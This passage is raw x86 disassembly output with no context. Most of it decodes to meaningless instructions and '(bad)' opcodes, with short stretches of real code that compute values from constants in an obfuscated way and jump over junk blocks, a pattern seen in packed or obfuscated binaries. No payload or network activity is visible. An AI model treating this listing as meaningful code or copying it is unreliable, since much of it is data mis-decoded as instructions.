  40f15e:	and    al,BYTE PTR [ebp-0x606114f5]
  40f164:	push   esi
  40f165:	popa   
  40f166:	xchg   ecx,eax
  40f167:	dec    edx
  40f168:	inc    ebp
  40f169:	cwde   
  40f16a:	inc    edx
  40f16b:	xor    al,0x73
  40f16d:	and    al,al
  40f16f:	mov    ebp,0xb5423758
  40f174:	inc    ebp
  40f175:	jl     0x40f0fd
  40f177:	ja     0x40f17b
  40f179:	inc    ebp
  40f17a:	push   es
  40f17b:	pop    esp
  40f17c:	cli    
  40f17d:	scas   eax,DWORD PTR es:[edi]
  40f17e:	fs jmp 0x40f173
  40f181:	add    dl,ch
  40f183:	pop    edi
  40f184:	scas   eax,DWORD PTR es:[edi]
  40f185:	mov    ch,BYTE PTR [eax+0x62eb86bf]
  40f18b:	add    BYTE PTR [ebx-0x1d],bl
  40f18e:	mov    ebp,0xeebfd9af
  40f193:	in     eax,0x38
  40f195:	mov    ds,WORD PTR [edi+0x48]
  40f198:	cmp    BYTE PTR [si+0x21],bl
  40f19c:	enter  0x7aea,0xc9
  40f1a0:	repz scas al,BYTE PTR es:[edi]
  40f1a2:	mov    bx,0xdb3d
  40f1a6:	add    eax,0x5db1130c
  40f1ab:	adc    DWORD PTR cs:[edi],edi
  40f1ae:	retf   0xd760
  40f1b1:	sub    esi,edi
  40f1b3:	or     al,0xa2
  40f1b5:	sub    esi,ebx
  40f1b7:	and    DWORD PTR [ecx+0x26],edx
  40f1ba:	pop    es
  40f1bb:	adc    bl,BYTE PTR [esi-0x58]
  40f1be:	inc    edi
  40f1bf:	add    BYTE PTR [ebx+0x39],al
  40f1c2:	(bad)  
  40f1c4:	not    BYTE PTR [edi-0x64]
  40f1c7:	sbb    edx,DWORD PTR [ecx+0x50]
  40f1ca:	jl     0x40f1fe
  40f1cc:	inc    esp
  40f1cd:	jns    0x40f171
  40f1cf:	shl    cl,1
  40f1d1:	cli    
  40f1d2:	dec    ecx
  40f1d3:	dec    edi
  40f1d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1d5:	mul    DWORD PTR [esi]
  40f1d7:	adc    eax,0xb082bbc6
  40f1dc:	imul   ecx,DWORD PTR [esi],0x9f240651
  40f1e2:	jmp    0x6ee9:0xebff7c76
  40f1e9:	pop    es
  40f1ea:	pushf  
  40f1eb:	sbb    DWORD PTR [ebp+0x3],0xb4879904
  40f1f2:	retf   0xd6a
  40f1f5:	les    ebp,FWORD PTR [edx]
  40f1f7:	jo     0x40f244
  40f1f9:	packsswb mm3,QWORD PTR [edx-0x350ac014]
  40f200:	jmp    0x1682f6c6
  40f205:	pop    esi
  40f206:	adc    ebp,eax
  40f208:	push   edx
  40f209:	mov    ds:0x9e4f6c9a,eax
  40f20e:	mov    ecx,0xc8b010f8
  40f213:	pop    esi
  40f214:	push   ecx
  40f215:	add    ebp,DWORD PTR [eax-0x6]
  40f218:	fimul  WORD PTR [ebp+ebp*2+0x62]
  40f21c:	dec    edx
  40f21d:	and    eax,ebp
  40f21f:	std    
  40f220:	xlat   BYTE PTR ds:[ebx]
  40f221:	mov    BYTE PTR [ecx+eax*8],cl
  40f224:	xchg   esi,eax
  40f225:	inc    eax
  40f226:	add    ecx,DWORD PTR [edx+0x1]
  40f229:	stc    
  40f22a:	sbb    edi,DWORD PTR gs:[eax]
  40f22d:	pop    es
  40f22e:	add    al,0xe3
  40f230:	or     ah,BYTE PTR [eax+eax*1]
  40f233:	retf   0xe29c
  40f236:	mov    esp,0x7d575e48
  40f23b:	jno    0x40f1df
  40f23d:	dec    ebp
  40f23e:	pop    ecx
  40f23f:	and    dl,bl
  40f241:	mov    edx,0x34dd252e
  40f246:	jne    0x40f250
  40f248:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f249:	fadd   st(1),st
  40f24b:	cmc    
  40f24c:	stos   DWORD PTR es:[edi],eax
  40f24d:	xchg   DWORD PTR [eax],ebx
  40f24f:	push   ecx
  40f250:	xor    al,0x7d
  40f252:	or     BYTE PTR [esi-0x4e],bl
  40f255:	stos   BYTE PTR es:[edi],al
  40f256:	fsubr  DWORD PTR [edi-0x24993876]
  40f25c:	jns    0x40f242
  40f25e:	or     edx,ebx
  40f260:	mov    esi,esp
  40f262:	jecxz  0x40f200
  40f264:	sub    eax,0x7fc0958f
  40f269:	clc    
  40f26a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f26b:	test   al,0xa
  40f26d:	int3   
  40f26e:	cdq    
  40f26f:	adc    BYTE PTR [ebx],bl
  40f271:	les    esi,FWORD PTR [edi]
  40f273:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f274:	dec    ebp
  40f275:	rol    BYTE PTR [edx],0xfa
  40f278:	int3   
  40f279:	call   0x7903:0xdd3e133e
  40f280:	xchg   ebx,eax
  40f281:	leave  
  40f282:	aaa    
  40f283:	xor    DWORD PTR [esi],ebp
  40f285:	xor    DWORD PTR [eax-0xc],esi
  40f288:	jge    0x40f269
  40f28a:	pop    edi
  40f28b:	div    ebx
  40f28d:	ret    
  40f28e:	pop    dx
  40f290:	pop    eax
  40f291:	ins    BYTE PTR es:[edi],dx
  40f292:	leave  
  40f293:	call   0xc321:0xbef72338
  40f29a:	or     esi,DWORD PTR [ecx-0x221d51d1]
  40f2a0:	sahf   
  40f2a1:	jno    0x40f2ee
  40f2a3:	sub    esi,DWORD PTR [ecx+0x3e8d623e]
  40f2a9:	dec    esi
  40f2aa:	fldcw  WORD PTR [edi-0x4beb6479]
  40f2b0:	xchg   edx,eax
  40f2b1:	ins    BYTE PTR es:[edi],dx
  40f2b2:	dec    ecx
  40f2b3:	push   ds
  40f2b4:	xchg   ecx,eax
  40f2b5:	add    DWORD PTR [ecx],edx
  40f2b7:	cs push ebx
  40f2b9:	mov    ah,0xb1
  40f2bb:	jle    0x40f280
  40f2bd:	test   BYTE PTR [esi-0x55],bh
  40f2c0:	(bad)  
  40f2c1:	or     esp,DWORD PTR [edi]
  40f2c3:	int    0xc6
  40f2c5:	push   eax
  40f2c6:	jg     0x40f264
  40f2c8:	inc    edi
  40f2c9:	ja     0x40f2b7
  40f2cb:	mov    ah,0x28
  40f2cd:	sbb    edx,esp
  40f2cf:	test   eax,0x27438f97
  40f2d4:	mov    DWORD PTR [ebp-0x7b],edx
  40f2d7:	jle    0x40f2ee
  40f2d9:	xchg   eax,ecx
  40f2db:	jbe    0x40f2e1
  40f2dd:	mov    WORD PTR [ebp+0x4847c8f7],gs
  40f2e3:	adc    eax,0x1af9fb91
  40f2e8:	sub    cl,BYTE PTR [ebx]
  40f2ea:	cmp    cl,BYTE PTR [ebx+eiz*8+0x1b92b537]
  40f2f1:	pop    ss
  40f2f2:	arpl   WORD PTR [ecx-0x27a35d2a],di
  40f2f8:	ret    0xf70b
  40f2fb:	std    
  40f2fc:	hlt    
  40f2fd:	daa    
  40f2fe:	adc    BYTE PTR ds:0xbfc8a54d,dh
  40f304:	(bad)  
  40f305:	(bad)  
  40f306:	xchg   ecx,eax
  40f307:	push   0x58
  40f309:	call   0x4573:0xe82faf31
  40f310:	adc    dl,BYTE PTR [eax-0x80]
  40f313:	outs   dx,BYTE PTR ds:[esi]
  40f314:	idiv   cl
  40f316:	call   0x8441:0xeb87109a
  40f31d:	fsubr  QWORD PTR [edi+0x5e]
  40f320:	add    al,0xd9
  40f322:	lds    edx,FWORD PTR [edx]
  40f324:	stos   DWORD PTR es:[edi],eax
  40f325:	pushf  
  40f326:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f327:	test   DWORD PTR [ebx-0x16a6be0e],ebp
  40f32d:	je     0x40f38f
  40f32f:	mov    ds:0x68fd79c4,eax
  40f334:	iret   
  40f335:	mov    dh,0x3f
  40f337:	ret    0xf8e
  40f33a:	test   eax,0xbe34a08a
  40f33f:	cmc    
  40f340:	push   0x3e99e3d7
  40f345:	sub    ecx,ebp
  40f347:	xchg   edi,eax
  40f348:	push   ebx
  40f349:	adc    dh,BYTE PTR [edi+edi*8-0x24]
  40f34d:	leave  
  40f34e:	sti    
  40f34f:	loop   0x40f3af
  40f351:	pop    ebx
  40f352:	leave  
  40f353:	ret    0xc
  40f356:	push   ebp
  40f357:	mov    ebp,esp
  40f359:	sub    esp,0xec
  40f35f:	push   ebx
  40f360:	push   esi
  40f361:	mov    DWORD PTR [ebp-0x8],0x548e
  40f368:	mov    DWORD PTR [ebp-0x4],0x61c2
  40f36f:	mov    eax,DWORD PTR [ebp-0x4]
  40f372:	jmp    0x40f640
  40f377:	outs   dx,BYTE PTR ds:[esi]
  40f378:	rol    BYTE PTR [eax],cl
  40f37a:	jnp    0x40f399
  40f37c:	cmp    ch,BYTE PTR [edx-0x5e]
  40f37f:	ret    0x499f
  40f382:	push   0x55
  40f384:	pop    ss
  40f385:	fnstsw WORD PTR [esi+0x2b]
  40f388:	test   al,0x18
  40f38a:	sbb    BYTE PTR [esi-0x30e7e7ec],bh
  40f390:	loop   0x40f3b3
  40f392:	stc    
  40f393:	pop    esp
  40f394:	mov    ecx,0x901f3965
  40f399:	dec    esp
  40f39a:	add    bh,0xcd
  40f39d:	push   ebp
  40f39e:	adc    eax,0xb13f9893
  40f3a3:	out    0xeb,eax
  40f3a5:	mov    WORD PTR [esi-0x1],ss
  40f3a8:	xchg   BYTE PTR [esi+0x79993d5c],bl
  40f3ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3af:	loope  0x40f3c2
  40f3b1:	add    al,0x43
  40f3b3:	cvtdq2ps xmm1,XMMWORD PTR [eax-0x47dfcb11]
  40f3ba:	ficom  DWORD PTR [edi]
  40f3bc:	jo     0x40f352
  40f3be:	test   BYTE PTR [ebp+0x3e3722e5],ah
  40f3c4:	sbb    DWORD PTR [edi],ecx
  40f3c6:	adc    DWORD PTR [ecx+0x71],edx
  40f3c9:	movlps QWORD PTR [ebp-0x259a8a9c],xmm6
  40f3d0:	sbb    DWORD PTR [ecx],eax
  40f3d2:	ret    
  40f3d3:	retf   0x5ef4
  40f3d6:	cmp    cl,dl
  40f3d8:	mov    ecx,0x98a111fc
  40f3dd:	and    ecx,eax
  40f3df:	push   ebp
  40f3e0:	cmp    ecx,DWORD PTR ds:0x45c50805
  40f3e6:	push   ds
  40f3e7:	or     DWORD PTR [edi],edx
  40f3e9:	test   al,0xc8
  40f3eb:	mov    ecx,0x96294900
  40f3f0:	cwde   
  40f3f1:	sbb    ebp,DWORD PTR [ecx]
  40f3f3:	xchg   DWORD PTR [edi],eax
  40f3f5:	mov    cl,BYTE PTR [ebx+0x6ebbc053]
  40f3fb:	cli    
  40f3fc:	mov    dh,0xcc
  40f3fe:	test   eax,0x29f55d6
  40f403:	in     eax,dx
  40f404:	popa   
  40f405:	lahf   
  40f406:	stos   BYTE PTR es:[edi],al
  40f407:	or     al,0xdf
  40f409:	ret    
  40f40a:	lock fldl2e 
  40f40d:	or     dh,BYTE PTR [edx]
  40f40f:	cmp    bl,dh
  40f411:	add    eax,0xefbe3a62
  40f416:	cld    
  40f417:	icebp  
  40f418:	daa    
  40f419:	neg    cl
  40f41b:	ror    DWORD PTR [ecx],0x4b
  40f41e:	and    esi,DWORD PTR [ebp-0x50]
  40f421:	(bad)  
  40f423:	or     BYTE PTR [esi],al
  40f425:	mov    bh,0x89
  40f427:	dec    ebx
  40f428:	push   esp
  40f429:	popf   
  40f42a:	jmp    0x9e08b72d
  40f42f:	int3   
  40f430:	mov    ebp,0x79fdc29c
  40f435:	pop    edi
  40f436:	push   eax
  40f437:	rol    BYTE PTR [edi-0x10],1
  40f43a:	pop    ecx
  40f43b:	mov    es,edi
  40f43d:	cld    
  40f43e:	or     bl,0x3b
  40f441:	jae    0x40f496
  40f443:	lods   al,BYTE PTR ds:[esi]
  40f444:	(bad)  
  40f445:	mov    edi,0xab34a878
  40f44a:	adc    eax,0x2a5d9c0c
  40f44f:	enter  0xd20,0xd5
  40f453:	xchg   BYTE PTR [esi+0x203ae627],al
  40f459:	ret    0xb72c
  40f45c:	lahf   
  40f45d:	scas   al,BYTE PTR es:[edi]
  40f45e:	jns    0x40f464
  40f460:	cmc    
  40f461:	mov    dh,0x19
  40f463:	mov    eax,ds:0x7da4a98d
  40f468:	lahf   
  40f469:	jl     0x40f4bd
  40f46b:	and    al,0xd7
  40f46d:	scas   eax,DWORD PTR es:[edi]
  40f46e:	pushf  
  40f46f:	push   ebx
  40f470:	je     0x40f41d
  40f472:	inc    ebx
  40f473:	jg     0x40f498
  40f475:	stos   BYTE PTR es:[edi],al
  40f476:	add    BYTE PTR [esi-0xb60d31c],ah
  40f47c:	dec    edi
  40f47d:	add    al,0x9a
  40f47f:	inc    edi
  40f480:	leave  
  40f481:	(bad)  
  40f482:	int3   
  40f483:	push   esi
  40f484:	cmp    BYTE PTR [ebp+0xf],dh
  40f487:	and    edi,edx
  40f489:	xchg   ebx,eax
  40f48a:	sub    BYTE PTR [edx+eax*8],dl
  40f48d:	mov    ebp,0x36aa02d8
  40f492:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f493:	adc    BYTE PTR [eax+0x3d],dl
  40f496:	lds    edx,FWORD PTR [esi]
  40f498:	icebp  
  40f499:	add    cl,al
  40f49b:	scas   al,BYTE PTR es:[edi]
  40f49c:	jne    0x40f435
  40f49e:	lods   eax,DWORD PTR ds:[esi]
  40f49f:	sahf   
  40f4a0:	imul   BYTE PTR [eax+0x5d6b35a2]
  40f4a6:	mov    eax,ds:0x30c6f3c6
  40f4ab:	inc    esp
  40f4ac:	jbe    0x40f51d
  40f4ae:	in     eax,0x91
  40f4b0:	and    al,0x73
  40f4b2:	sbb    al,0x60
  40f4b4:	inc    ebx
  40f4b5:	mov    bl,0xb4
  40f4b7:	scas   al,BYTE PTR es:[di]
  40f4b9:	fidiv  DWORD PTR ss:[edx+0x8]
  40f4bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4be:	xchg   ecx,eax
  40f4bf:	mov    bl,0xfd
  40f4c1:	mov    es,WORD PTR [ebx+0x75]
  40f4c4:	lds    esp,FWORD PTR [ebx-0x6e1f07f1]
  40f4ca:	mov    edx,0xd0e43e8
  40f4cf:	mov    ebp,0x15459436
  40f4d4:	hlt    
  40f4d5:	cdq    
  40f4d6:	or     DWORD PTR [ecx],ebp
  40f4d8:	pushf  
  40f4d9:	jp     0x40f4f2
  40f4db:	dec    edi
  40f4dc:	push   ss
  40f4dd:	outs   dx,BYTE PTR ds:[esi]
  40f4de:	loop   0x40f474
  40f4e0:	jle    0x40f4ea
  40f4e2:	lods   al,BYTE PTR ds:[esi]
  40f4e3:	ret    
  40f4e4:	loopne 0x40f494
  40f4e6:	cmp    ecx,DWORD PTR [esi-0x73]
  40f4e9:	jnp    0x40f4c6
  40f4eb:	jns    0x40f4a4
  40f4ed:	xor    esi,0x25
  40f4f0:	push   0xa50a603
  40f4f5:	xlat   BYTE PTR ds:[ebx]
  40f4f6:	sub    ch,BYTE PTR [esp]
  40f4f9:	ja     0x40f505
  40f4fb:	add    eax,0xea7c659d
  40f500:	aaa    
  40f501:	sbb    al,0x86
  40f503:	jecxz  0x40f4d7
  40f505:	jg     0x40f502
  40f507:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f508:	dec    ecx
  40f509:	jmp    0x3c0686a9
  40f50e:	jge    0x40f55d
  40f510:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f511:	and    ebx,DWORD PTR [eax+0x6c922087]
  40f517:	lods   eax,DWORD PTR ds:[esi]
  40f518:	fiadd  DWORD PTR [ecx+0x7]
  40f51b:	jne    0x40f4a9
  40f51d:	push   cs
  40f51e:	rcl    eax,1
  40f520:	push   es
  40f521:	pop    esi
  40f522:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f523:	arpl   WORD PTR [esi-0x34a01f79],cx
  40f529:	aas    
  40f52a:	neg    DWORD PTR [edx-0x3a4e0f8a]
  40f530:	sub    dh,dl
  40f532:	and    al,BYTE PTR [edx-0x7a]
  40f535:	and    DWORD PTR [ecx],ebx
  40f537:	push   0x74
  40f539:	retf   
  40f53a:	xchg   edx,eax
  40f53b:	push   ss
  40f53c:	mov    bh,bl
  40f53e:	jmp    0xa50d:0xa9b6d353
  40f545:	popf   
  40f546:	pop    eax
  40f547:	cmp    DWORD PTR [eax+0x68],eax
  40f54a:	mov    bl,BYTE PTR [ecx]
  40f54c:	mov    dh,0xc8
  40f54e:	and    dh,cl
  40f550:	push   cs
  40f551:	retf   
  40f552:	jae    0x40f53f
  40f554:	mov    edi,0xf86821e5
  40f559:	sub    eax,0xee42ddb5
  40f55e:	mov    esp,0xf1c245cd
  40f563:	cs inc eax
  40f565:	(bad)  
  40f566:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f567:	loope  0x40f5be
  40f569:	mov    BYTE PTR [esi-0x70],ch
  40f56c:	mov    ds,WORD PTR [ebx+ebx*4-0x43]
  40f570:	sub    ecx,ebp
  40f572:	mov    edx,0xb6b90eb0
  40f577:	jns    0x40f4f9
  40f579:	xor    ecx,DWORD PTR [edi]
  40f57b:	mov    ecx,0xca4be643
  40f580:	add    eax,0x5991ec15
  40f585:	pop    ds
  40f586:	jg     0x40f575
  40f588:	jmp    0x40f5dc
  40f58a:	stc    
  40f58b:	in     al,0x6e
  40f58d:	mov    ebx,0xecfa7f5e
  40f592:	shr    ah,1
  40f594:	cld    
  40f595:	xor    BYTE PTR [ebp+0x47],ch
  40f598:	mov    edi,ebp
  40f59a:	and    eax,DWORD PTR [ebx-0x457e8c44]
  40f5a0:	dec    ecx
  40f5a1:	pmaxsw mm5,QWORD PTR [eax]
  40f5a4:	sbb    bl,BYTE PTR [ecx]
  40f5a6:	add    eax,DWORD PTR [edx-0x3c326ce1]
  40f5ac:	stos   BYTE PTR es:[edi],al
  40f5ad:	jecxz  0x40f5dc
  40f5af:	or     edi,DWORD PTR [ebp+0x13ab012d]
  40f5b5:	adc    DWORD PTR [edi+0x41],ebx
  40f5b8:	adc    eax,0x9571effa
  40f5bd:	jnp    0x40f59b
  40f5bf:	mov    ebp,0xa9b3d616
  40f5c4:	dec    edi
  40f5c5:	sbb    DWORD PTR [eax],ebx
  40f5c7:	imul   esi,DWORD PTR [eax-0x4e],0x8e77ed30
  40f5ce:	sub    edi,DWORD PTR [eax+0x23]
  40f5d1:	test   DWORD PTR [edx-0x38],edi
  40f5d4:	dec    ebp
  40f5d5:	cli    
  40f5d6:	jmp    0xf3ddd1b4
  40f5db:	push   es
  40f5dc:	dec    eax
  40f5dd:	js     0x40f65c
  40f5df:	add    dh,BYTE PTR [ebx]
  40f5e1:	mov    ds:0xd6fcd38e,al
  40f5e6:	and    al,0xbe
  40f5e8:	adc    eax,0xf4a1bb36
  40f5ed:	dec    esi
  40f5ee:	add    edx,DWORD PTR [edx]
  40f5f0:	xor    al,0xa0
  40f5f2:	sub    bh,bl
  40f5f4:	popf   
  40f5f5:	sub    al,0x62
  40f5f7:	push   edx
  40f5f8:	jo     0x40f615
  40f5fa:	and    cl,al
  40f5fc:	lods   al,BYTE PTR ds:[esi]
  40f5fd:	clc    
  40f5fe:	jb     0x40f5b1
  40f600:	mov    ecx,0x7fe22e8a
  40f605:	shl    DWORD PTR [eax],0x61
  40f608:	xchg   esi,eax
  40f609:	(bad)  
  40f60a:	xor    DWORD PTR [edx],ecx
  40f60c:	shl    BYTE PTR [edx],1
  40f60e:	mov    DWORD PTR [edx-0x28cb766f],edi
  40f614:	sahf   
  40f615:	(bad)  
  40f616:	cmp    al,BYTE PTR [ebx+eax*8-0x2d4d2ca0]
  40f61d:	jmp    0x269c:0x74213965
  40f624:	int3   
  40f625:	xchg   BYTE PTR [edx-0x48df1dd0],bh
  40f62b:	mov    ecx,0xf33d0ce6
  40f630:	out    dx,al
  40f631:	or     BYTE PTR [esi+0x2e],cl
  40f634:	ds jl  0x40f5de
  40f637:	push   edi
  40f638:	lods   al,BYTE PTR ds:[esi]
  40f639:	mov    BYTE PTR [edi-0x66],bh
  40f63c:	push   ebx
  40f63d:	pop    esp
  40f63e:	(bad)  
  40f640:	mov    ecx,DWORD PTR [ebp-0x8]
  40f643:	add    eax,0x1ca5
  40f648:	or     eax,ecx
  40f64a:	mov    ecx,DWORD PTR ds:0x4225b8
  40f650:	lea    eax,[eax+ecx*1-0x7eef]
  40f657:	mov    DWORD PTR [ebp-0x5c],eax
  40f65a:	mov    DWORD PTR [ebp-0x4],0x8ea
  40f661:	mov    DWORD PTR [ebp-0x8],0x5759
  40f668:	mov    eax,DWORD PTR [ebp-0x8]
  40f66b:	mov    ecx,DWORD PTR [ebp-0x4]
  40f66e:	and    eax,0x27f6
  40f673:	xor    eax,ecx
  40f675:	mov    ecx,DWORD PTR ds:0x4226ec
  40f67b:	imul   eax,eax,0x18
  40f67e:	xor    eax,0x17970
  40f683:	lea    eax,[ebp+eax*1-0x54]
  40f687:	mov    DWORD PTR [eax],ecx
  40f689:	mov    DWORD PTR [ebp-0x4],0x7584
  40f690:	mov    DWORD PTR [ebp-0x8],0x7c9f
  40f697:	mov    eax,DWORD PTR [ebp-0x8]
  40f69a:	xor    edx,edx
  40f69c:	push   0x3
  40f69e:	pop    ecx
  40f69f:	div    ecx
  40f6a1:	mov    ecx,DWORD PTR [ebp-0x4]
  40f6a4:	xor    edx,edx
  40f6a6:	push   0x2
  40f6a8:	add    eax,0x14d3
  40f6ad:	and    eax,ecx
  40f6af:	mov    ecx,0x6404
  40f6b4:	sub    ecx,eax
  40f6b6:	mov    DWORD PTR [ebp-0x74],ecx
  40f6b9:	mov    DWORD PTR [ebp-0xc],0x13b5
  40f6c0:	mov    DWORD PTR [ebp-0x8],0x2e54
  40f6c7:	mov    DWORD PTR [ebp-0x4],0x2f11
  40f6ce:	mov    eax,DWORD PTR [ebp-0x8]
  40f6d1:	mov    ecx,DWORD PTR [ebp-0x4]
  40f6d4:	lea    eax,[ecx+eax*1-0x65ec]
  40f6db:	mov    ecx,0x5e208
  40f6e0:	div    ecx
  40f6e2:	mov    ecx,DWORD PTR [ebp-0xc]
  40f6e5:	lea    eax,[eax+ecx*1+0x40c7]
  40f6ec:	mov    DWORD PTR [ebp-0x24],eax
  40f6ef:	mov    DWORD PTR [ebp-0x4],0x1bc6
  40f6f6:	mov    DWORD PTR [ebp-0x8],0x16ac
  40f6fd:	mov    DWORD PTR [ebp-0xc],0x2185
  40f704:	mov    eax,DWORD PTR [ebp-0xc]
  40f707:	mov    ecx,DWORD PTR [ebp-0x8]
  40f70a:	xor    eax,0x1f75
  40f70f:	sub    eax,ecx
  40f711:	mov    ecx,DWORD PTR [ebp-0x4]
  40f714:	jmp    0x40f9e2
  40f719:	mov    ch,0xd2
  40f71b:	pop    edx
  40f71c:	mov    BYTE PTR [edx+0x20],bl
  40f71f:	stos   DWORD PTR es:[edi],eax
  40f720:	and    dl,BYTE PTR [edx+0x34]
  40f723:	sbb    BYTE PTR [edx+0x7e1f2d3f],ch
  40f729:	shl    DWORD PTR [edx+0x14be1818],1
  40f72f:	sbb    BYTE PTR [eax],bl
  40f731:	out    0x8b,eax
  40f733:	xor    dh,bh
  40f735:	mov    ss,WORD PTR [edi+ebx*2+0x6d]
  40f739:	bswap  edi
  40f73b:	rol    ch,0x68
  40f73e:	pop    ss
  40f73f:	lds    esp,FWORD PTR [edx-0x286767d8]
  40f745:	mov    dl,0x46
  40f747:	xor    BYTE PTR [edi-0x76dac9ff],al
  40f74d:	sbb    eax,esp
  40f74f:	stos   BYTE PTR es:[edi],al
  40f750:	(bad)  
  40f751:	adc    BYTE PTR [esi+0x51],bh
  40f754:	xchg   BYTE PTR [ecx+0x7d282590],ah
  40f75a:	cmp    ch,ch
  40f75c:	and    eax,0xcab86b4f
  40f761:	add    ebx,ecx
  40f763:	ret    
  40f764:	out    0xae,eax
  40f766:	mov    eax,ds:0xaf31325c
  40f76b:	dec    esp
  40f76c:	mov    ebx,0x73de9f6a
  40f771:	jle    0x40f77e
  40f773:	xchg   edi,eax
  40f774:	xor    cl,BYTE PTR [eax]
  40f776:	test   BYTE PTR [edi+0x5b],al
  40f779:	bound  esp,QWORD PTR [ecx-0x3c3a45fa]
  40f77f:	fcom   DWORD PTR [eax-0x33]
  40f782:	pop    esp
  40f783:	jmp    0x40f784
  40f785:	adc    al,0x62
  40f787:	sbb    BYTE PTR [ebp-0x20],bh
  40f78a:	push   esp
  40f78b:	call   esi
  40f78d:	sub    esi,DWORD PTR [ebx+0x66]
  40f790:	out    dx,al
  40f791:	adc    edx,edx
  40f793:	stos   DWORD PTR es:[edi],eax
  40f794:	inc    ebp
  40f795:	adc    esi,esp
  40f797:	push   0x9
  40f799:	sub    esp,DWORD PTR [eax]
  40f79b:	popa   
  40f79c:	cmp    eax,DWORD PTR [eax]
  40f79e:	cs in  eax,dx
  40f7a0:	rcl    DWORD PTR [eax-0x62],1
  40f7a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7a4:	call   0xce88fd20
  40f7a9:	pop    ecx
  40f7aa:	cwde   
  40f7ab:	xchg   edx,eax
  40f7ac:	shl    BYTE PTR [ebp+0x3],cl
  40f7af:	ret    
  40f7b0:	mov    al,ds:0x201e3abc
  40f7b5:	mov    dh,0xe6
  40f7b7:	daa    
  40f7b8:	cmp    DWORD PTR [edi],esi
  40f7ba:	or     edx,DWORD PTR [ebp-0x77c7cce1]
  40f7c0:	inc    edi
  40f7c1:	ins    BYTE PTR es:[edi],dx
  40f7c2:	inc    esi
  40f7c3:	enter  0xb527,0x58
  40f7c7:	lock not DWORD PTR [eax]
  40f7ca:	pushf  
  40f7cb:	and    eax,0x7c1ebd37
  40f7d0:	sub    ch,cl
  40f7d2:	mov    bh,0xbc
  40f7d4:	test   BYTE PTR ds:0xf8de46ef,bh
  40f7da:	pop    eax
  40f7db:	shr    DWORD PTR [ebx+0x79],cl
  40f7de:	inc    ecx
  40f7df:	mov    esp,DWORD PTR [ebx+0x31bbafe9]
  40f7e5:	xchg   esp,eax
  40f7e6:	cs (bad) 
  40f7e8:	int3   
  40f7e9:	iret   
  40f7ea:	adc    edi,DWORD PTR [edi+ebx*1+0x208c385b]
  40f7f1:	icebp  
  40f7f2:	sbb    eax,0x1afbc48c
  40f7f7:	xlat   BYTE PTR ds:[ebx]
  40f7f8:	pop    edx
  40f7f9:	inc    edi
  40f7fa:	jne    0x40f848
  40f7fc:	pushf  
  40f7fd:	add    eax,0xe9750390
  40f802:	std    
  40f803:	push   0x79b3f2fb
  40f808:	cmp    DWORD PTR [esi+0x56271345],ebp
  40f80e:	jmp    0x40f7b7
  40f810:	pop    ecx
  40f811:	jge    0x40f883
  40f813:	dec    eax
  40f814:	ins    DWORD PTR es:[edi],dx
  40f815:	leave  
  40f816:	inc    edi
  40f817:	push   edx
  40f818:	push   esi
  40f819:	xor    DWORD PTR [ecx],esi
  40f81b:	lds    edx,FWORD PTR [esi-0x161ae425]
  40f821:	dec    esp
  40f822:	push   edi
  40f823:	test   BYTE PTR [ebx-0x1d],al
  40f826:	mov    ah,BYTE PTR [esi]
  40f828:	loope  0x40f86d
  40f82a:	aaa    
  40f82b:	cmp    eax,0xc97ca71a
  40f830:	add    al,0x26
  40f832:	mov    ch,0xe1
  40f834:	aad    0x4e
  40f836:	or     esi,DWORD PTR [ecx+0x64049415]
  40f83c:	call   DWORD PTR [ebx+0x29074571]
  40f842:	mov    DWORD PTR [edi+0x5603fb51],edi
  40f848:	aas    
  40f849:	inc    ecx
  40f84a:	popa   
  40f84b:	retf   0xd84d
  40f84e:	push   esi
  40f84f:	retf   0xe15
  40f852:	and    eax,0x6bd712f4
  40f857:	adc    al,0x7
  40f859:	push   ss
  40f85a:	adc    DWORD PTR [esi-0x689e91b5],esi
  40f860:	aad    0x57
  40f862:	pop    ebp
  40f863:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f864:	icebp  
  40f865:	jg     0x40f7f5
  40f867:	xchg   ebp,eax
  40f868:	mov    dl,0x39
  40f86a:	cmp    eax,0x9fe64c6d
  40f86f:	sub    edi,DWORD PTR [esp+eax*2-0x2ae56680]
  40f876:	xchg   esp,eax
  40f877:	pop    ss
  40f878:	cmp    al,0x30
  40f87a:	aad    0x37
  40f87c:	outs   dx,DWORD PTR ds:[esi]
  40f87d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f87e:	mov    BYTE PTR [eax-0x37007b70],al
  40f884:	jmp    FWORD PTR [ecx+0x54]
  40f887:	out    dx,eax
  40f888:	mov    bl,0xdf
  40f88a:	adc    eax,0x87ff1c23
  40f88f:	out    dx,eax
  40f890:	mov    ebp,0x1a0fe0c6
  40f895:	es loop 0x40f859
  40f898:	xchg   ebp,eax
  40f899:	inc    edx
  40f89a:	imul   esp,ebp,0xea106101
  40f8a0:	jle    0x40f827
  40f8a2:	push   ss
  40f8a3:	call   0x7697:0x513dca68
  40f8aa:	mov    edx,DWORD PTR [esi+0x2b692a3b]
  40f8b0:	icebp  
  40f8b1:	adc    esi,edi
  40f8b3:	pop    ds
  40f8b4:	loop   0x40f866
  40f8b6:	(bad)  
  40f8b7:	arpl   WORD PTR [ecx],sp
  40f8b9:	lods   al,BYTE PTR ds:[esi]
  40f8ba:	call   0xb3b2:0x584c838f
  40f8c1:	pop    ebx
  40f8c2:	dec    ebp
  40f8c3:	fbld   TBYTE PTR [ebp-0x33]
  40f8c6:	(bad)  
  40f8c7:	frstor [ebx]
  40f8c9:	push   DWORD PTR [edi-0x8]
  40f8cc:	sub    edx,DWORD PTR [ebx-0x12eb8c9]
  40f8d2:	mov    BYTE PTR [eax+0x3d],0x5c
  40f8d6:	or     eax,0x34e329ab
